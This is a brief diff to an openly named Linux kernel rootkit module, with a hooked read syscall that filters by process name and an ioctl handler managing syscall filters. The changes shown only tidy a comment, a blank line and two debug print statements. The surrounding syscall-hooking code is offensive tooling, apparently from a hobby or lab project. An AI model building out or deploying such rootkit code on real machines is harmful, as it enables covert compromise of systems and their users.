@@ -41,7 +41,7 @@ MODULE_LICENSE("Dual MIT/GPL");
 MODULE_VERSION("0.1");
 
 static asmlinkage long my_sys_read(const struct pt_regs *regs) {
-  //pr_warn("my_sys_read\n");
+  // pr_warn("my_sys_read\n");
   struct filter_info *pos;
   list_for_each_entry(pos, &filter_list.list, list) {
     if (strcmp(pos->comm, current->comm) == 0 && pos->syscall_nr == __NR_read) {
@@ -182,7 +182,6 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 
     struct filter_info *pos;
 
-
     if (total_references[filter->syscall_nr] > 0) {
       list_for_each_entry(pos, &filter_list.list, list) {
         if (pos->syscall_nr == filter->syscall_nr) {
@@ -201,8 +200,6 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
     }
 
     total_references[filter->syscall_nr] += 1;
-    pr_warn("read %d\n", total_references[__NR_read]);
-    pr_warn("mkdir %d\n", total_references[__NR_mkdirat]);
 
     list_add(&filter->list, &filter_list.list);
     break;
